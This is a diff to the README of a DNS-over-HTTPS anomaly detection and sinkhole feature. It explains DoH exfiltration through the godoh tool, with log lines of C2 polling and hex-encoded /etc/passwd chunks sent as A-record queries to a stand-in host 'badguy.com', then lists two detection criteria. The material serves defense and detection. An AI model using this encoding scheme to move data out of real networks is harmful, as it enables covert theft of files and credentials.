@@ -56,11 +56,37 @@ Unquestionably, DNS-over-HTTPS is an important privacy enhancement to DNS; but i
 ------
 ### DoH Anomaly Detection Explained
 
-Before getting into the weeds of DoH anomaly detection, it's important to illustrate a simple example of an actual exploit. There are many different tools for doing DoH exfiltration, but they all run on the same basic principles: encoding chunks of data in multiple DNS requests.
+Before getting into the weeds of DoH anomaly detection, it's important to illustrate an actual exploit. There are many different tools for doing DoH exfiltration, but they all run on essentially the same basic principles: encoding chunks of data in multiple DNS requests. A compromised system inside the corporate network will make DNS-over-HTTPS queries to some public DoH service (ex. Cloudflare), which wlll forward those requests to a C2 DNS instance somewhere on the Internet. From the organization's perspective, this is just HTTPS traffic going to Cloudflare. The compromised client "agent" will periodically query the C2 instance, and when ready the C2 instance will issue a command in its response. We can look at a simple example from the **godoh** tool. In this case, the client agent makes successful contact with the C2 instance and sends periodic queries, waiting for commands:
 
-There are a number of ways to "detect" anomalous DNS-over-HTTPS traffic...
+```bash
+DoH TXT Query: name=6d73687836.badguy.com,type=16,version=JSON,id=null
+DoH TXT Query: name=6d73687836.badguy.com,type=16,version=JSON,id=null
+DoH TXT Query: name=6d73687836.badguy.com,type=16,version=JSON,id=null
+DoH TXT Query: name=6d73687836.badguy.com,type=16,version=JSON,id=null
+```
 
-[Real time detection of malicious DoH traffic using statistical analysis](https://www.sciencedirect.com/science/article/pii/S1389128623003559)
+This is a DNS **TXT** record request. At some point, the C2 instance will issue a command that it encodes in its TXT record response. The C2 server could, for example, say something like, "Give me your /etc/passwd file." The client agent will then go do the thing (get the local /etc/passwd file), break it into a bunch of small pieces, encode those pieces, and then send those pieces to the C2 instance as A record requests:
+
+```bash
+DoH A Query: name=d34a.be.0.00.0.0.0.0.0.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.be.0.00.0.0.0.0.0.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.1.4cf57533.0.3.1f8b08000000000002ff001f05e0fa6d49899cb2fc640f5204e16f8c9f37.090d121781de2b97925c886bde9e8a86f490b1651ed1bb585e31ffed9b3c.aff0c7a3598c1e2d5332335484b6dc41d33c7881b5a0a14d821e4338af56.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.1.4cf57533.0.3.1f8b08000000000002ff001f05e0fa6d49899cb2fc640f5204e16f8c9f37.090d121781de2b97925c886bde9e8a86f490b1651ed1bb585e31ffed9b3c.aff0c7a3598c1e2d5332335484b6dc41d33c7881b5a0a14d821e4338af56.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.12.a88ac3df.0.3.f943910ae0adcf7105990f3192c19236d04c0df22f897d91c3efec75f2d1.f9d26d1e218b77c6a28c9681391596f610ecbfac02f5b3bc5d5763b891c4.ea32f05d2bfc4eb65078835e0d8234f8b76bf20099e87b13305d14c23f98.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.13.bae530bc.0.3.047a8ba7091ff997b517777da8d59aefcefd0f263cf3ccb740ba5c848a53.25f6eecf8133876d2376abf317cb18239d17ac36432335d5ddbb75346fc4.e7d61353628401eba13398c19e4a1dd0f7d4f9a17d07e1f750aaba51285f.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.13.bae530bc.0.3.047a8ba7091ff997b517777da8d59aefcefd0f263cf3ccb740ba5c848a53.25f6eecf8133876d2376abf317cb18239d17ac36432335d5ddbb75346fc4.e7d61353628401eba13398c19e4a1dd0f7d4f9a17d07e1f750aaba51285f.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.14.87b9a653.0.3.dfb7c15f347f5bbb7ae0e716edf93cce77d4a5856de2c251554b38f4f237.dacf1716ba71620dba5345a01acfd849cc31872c12c0dff47919ccfdf0d3.e330811ce3a6a5fa1f198fff8fbce36c384778270ec6d31300a164ebd79f.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.14.87b9a653.0.3.dfb7c15f347f5bbb7ae0e716edf93cce77d4a5856de2c251554b38f4f237.dacf1716ba71620dba5345a01acfd849cc31872c12c0dff47919ccfdf0d3.e330811ce3a6a5fa1f198fff8fbce36c384778270ec6d31300a164ebd79f.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.15.53682df3.0.3.d455f8fd1fa1547fdef9eea4581fdabd4fb1b5418bd65a186f04a8d8a496.1e16f5b4a42bd4a4e4c852f045705ca321de5879176fd0a3671dbaf9e9ac.4dea784db392010000ffff7086b2021f050000.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ef.15.53682df3.0.3.d455f8fd1fa1547fdef9eea4581fdabd4fb1b5418bd65a186f04a8d8a496.1e16f5b4a42bd4a4e4c852f045705ca321de5879176fd0a3671dbaf9e9ac.4dea784db392010000ffff7086b2021f050000.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ca.16.00.0.0.0.0.0.badguy.com,type=1,version=JSON,id=null
+DoH A Query: name=d34a.ca.16.00.0.0.0.0.0.badguy.com,type=1,version=JSON,id=null
+```
+
+There are a number of ways to "detect" anomalous DNS-over-HTTPS traffic, as documented in [Real time detection of malicious DoH traffic using statistical analysis](https://www.sciencedirect.com/science/article/pii/S1389128623003559). In this implementation we focus on two of these:
+
+* **Abnormally long subdomain names**: where, as illustrated above, the full subdomain in a DoH exfiltration event will exceed some character length (default 52 characters).
+* **Uncommon query types**: where the DoH agent uses an uncommon query type to convey messages (ex. NULL, NAPTR).
 
 ------
 ### DoH Blackhole Action Explained
@@ -74,6 +100,13 @@ In a sinkhole response, the resolver sends back an IP address that points to a l
 
 * A sinkhole internal virtual server that simply hosts the "blank" certificate that SSL Orchestrator will use to mint a trusted server certificate to the client.
 * An SSL Orchestrator outbound L3 topology modified to listen on the sinkhole destination IP, and inject the blocking response content.
+
+
+
+
+
+
+
 
 
 
